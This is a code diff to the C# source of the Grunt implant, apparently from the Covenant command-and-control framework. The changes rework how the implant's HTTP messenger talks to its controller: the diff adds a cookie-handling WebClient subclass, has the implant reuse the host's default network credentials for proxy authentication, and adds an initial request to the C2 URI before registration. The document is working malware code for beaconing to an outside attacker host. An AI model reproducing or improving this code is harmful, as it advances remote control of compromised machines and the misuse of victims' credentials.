@@ -189,7 +189,7 @@ namespace Grunt
 
         private Random Random { get; } = new Random();
 
-        private WebClient CovenantClient { get; set; } = new WebClient();
+        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
 
         public GruntMessenger(int Id, string Name, string CovenantURI, string CovenantCertHash, Aes SessionKey, string RegisterBody, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls, List<string> ProfileHttpCookies, string ProfileHttpGetResponse, string ProfileHttpPostRequest, string ProfileHttpPostResponse)
         {
@@ -197,6 +197,7 @@ namespace Grunt
             this.GruntName = Name;
             this.CovenantURI = CovenantURI;
             this.SessionKey = SessionKey;
+            CovenantClient.UseDefaultCredentials = true;
             CovenantClient.Proxy = WebRequest.DefaultWebProxy;
             CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
             if (CovenantCertHash != "")
@@ -215,7 +216,9 @@ namespace Grunt
             this.ProfileHttpPostRequest = ProfileHttpPostRequest;
             this.ProfileHttpPostResponse = ProfileHttpPostResponse;
 
+            this.CovenantClient.DownloadString(this.CovenantURI + this.ProfileHttpUrls[Random.Next(this.ProfileHttpUrls.Count)]);
             this.CookieAuthKey = this.PostMessage(RegisterBody, "", GruntEncryptedMessageType.Register).Replace("\"", "");
+            this.CovenantClient.Add(new Cookie(this.ProfileHttpCookies[Random.Next(this.ProfileHttpCookies.Count)], this.CookieAuthKey, "/", this.CovenantURI.Split(':')[1].Split('/')[2]));
         }
 
         public string PostMessage(string message, string meta, GruntEncryptedMessageType messageType = GruntEncryptedMessageType.PostTask)
@@ -224,10 +227,6 @@ namespace Grunt
             GruntEncryptedMessage postMessage = this.Create(Common.GruntEncoding.GetBytes(message), meta, messageType);
 			this.CovenantClient.Headers.Clear();
 			for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
-			if (this.CookieAuthKey != "")
-			{
-                this.CovenantClient.Headers.Set(HttpRequestHeader.Cookie, this.ProfileHttpCookies[Random.Next(this.ProfileHttpCookies.Count)] + "=" + this.CookieAuthKey);
-			}
             string messageString = GruntEncryptedMessage.ToJson(postMessage);
 			string transformedMessage = Utilities.HttpMessageTransform.Transform(Common.GruntEncoding.GetBytes(messageString));
 			string data = String.Format(this.ProfileHttpPostRequest, transformedMessage);
@@ -246,10 +245,6 @@ namespace Grunt
             string path = this.ProfileHttpUrls[Random.Next(this.ProfileHttpUrls.Count)];
             this.CovenantClient.Headers.Clear();
             for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
-            if (this.CookieAuthKey != "")
-            {
-                this.CovenantClient.Headers.Set(HttpRequestHeader.Cookie, this.ProfileHttpCookies[Random.Next(this.ProfileHttpCookies.Count)] + "=" + this.CookieAuthKey);
-            }
             string response = CovenantClient.DownloadString(this.CovenantURI + path);
             string extracted = Utilities.Parse(response, this.ProfileHttpPostResponse)[0];
 
@@ -281,6 +276,26 @@ namespace Grunt
                 IV = Convert.ToBase64String(encryptionIV),
                 HMAC = Convert.ToBase64String(hmac)
             };
+        }
+
+        public class CookieWebClient : WebClient
+        {
+            public CookieContainer CookieContainer { get; private set; }
+            public CookieWebClient()
+            {
+                this.CookieContainer = new CookieContainer();
+            }
+            public void Add(Cookie cookie)
+            {
+                this.CookieContainer.Add(cookie);
+            }
+            protected override WebRequest GetWebRequest(Uri address)
+            {
+                var request = base.GetWebRequest(address) as HttpWebRequest;
+                if (request == null) return base.GetWebRequest(address);
+                request.CookieContainer = CookieContainer;
+                return request;
+            }
         }
     }
 
